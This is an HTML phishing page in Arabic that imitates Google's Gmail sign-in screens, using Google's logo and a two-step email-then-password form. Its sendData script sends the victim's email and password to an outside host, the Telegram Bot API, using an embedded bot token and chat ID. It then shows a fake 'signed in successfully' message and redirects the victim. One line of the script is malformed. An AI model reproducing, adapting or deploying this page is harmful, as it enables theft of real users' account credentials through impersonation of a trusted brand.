<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>تسجيل الدخول - Google</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      background: url("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSq19yICTWAbF0PgoNE2Iq5KE58cYS2ySo7-C5TSZVZypdg4KvLTTC8hmRv&s=10") no-repeat center center fixed;
      background-size: cover;
      font-family: 'Roboto', 'Tahoma', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .form-container {
      background: #fff;
      width: 360px;
      padding: 40px 30px;
      border-radius: 8px;
      box-shadow: 0 1px 4px rgba(0,0,0,0.2);
      text-align: right;
      animation: fadeIn 0.5s ease-in-out;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .form-container img {
      display: block;
      margin: 0 auto 20px;
      height: 40px;
    }

    h2 {
      font-size: 24px;
      margin: 0 0 10px;
      color: #202124;
    }

    p {
      font-size: 14px;
      color: #5f6368;
      margin-bottom: 20px;
    }

    .input-group {
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 12px 10px;
      font-size: 16px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      outline: none;
    }

    input:focus {
      border: 2px solid #1a73e8;
    }

    button {
      background-color: #1a73e8;
      color: white;
      border: none;
      padding: 10px;
      font-size: 15px;
      border-radius: 4px;
      width: 100%;
      cursor: pointer;
      margin-top: 10px;
    }

    .link {
      color: #1a73e8;
      text-decoration: none;
      font-size: 13px;
      display: block;
      margin-top: 12px;
    }

    .status {
      margin-top: 12px;
      font-size: 13px;
      color: #d93025;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="form-container" id="formBox">
    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png">
    <h2>تسجيل الدخول</h2>
    <p>انتقل إلى Gmail</p>
    <div class="input-group">
      <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف">
    </div>
    <a class="link" href="#">هل نسيت البريد الإلكتروني؟</a>
    <button onclick="goToPassword()">التالي</button>
    <a class="link" href="#">انشاء حساب آخر</a>
    <div class="status" id="status"></div>
  </div>

  <script>
    function goToPassword() {
      const emailInput = document.getElementById("email");
      const email = emailInput.value.trim();
      const displayEmail = email || "المستخدم";

      const formBox = document.getElementById("formBox");
      formBox.innerHTML = `
        <div class="form-container">
          <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png">
          <h2>مرحبًا ${displayEmail}</h2>
          <p>أدخل كلمة المرور لحسابك</p>
          <div class="input-group">
            <input type="password" id="password" placeholder="كلمة المرور">
          </div>
          <a class="link" href="#">هل نسيت كلمة المرور؟</a>
          <button onclick="sendData('${email || 'غير محدد'}')">تسجيل الدخول</button>
          <a class="link" href="#">انشاء حساب آخر</a>
          <div class="status" id="status"></div>
        </div>
      `;
    }

    function sendData(email) {
      const passwordInput = document.getElementById("password");
      const password = passwordInput.value.trim();
      const statusEl = document.getElementById("status");

      if (!password) {
        statusEl.textContent = "يرجى إدخال كلمة المرور.";
        return;
      }

      statusEl.textContent "تم تسجيل الدخول ";

      const message = `📥 تسجيل دخول جديد:\n📧 البريد: ${email}\n🔐 كلمة المرور: ${password}`;
      const token = "8185557975:AAEDUZuAvskBZTTvSqyHKfcVuR3CfoRjp3U";
      const chat_id = "6894787120";
      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;

      fetch(url)
        .then(res => {
          if (!res.ok) throw new Error("فشل الاتصال");
          statusEl.style.color = "#188038";
          statusEl.textContent = "✅ تم تسجيل الدخول بنجاح . يتم التحويل...";
          setTimeout(() => {
            window.location.href = "www.arbada.com";
          }, 1500);
        })
        .catch(() => {
          statusEl.textContent = "❌ فشل في الإرسال.";
        });
    }
  </script>
</body>
</html>
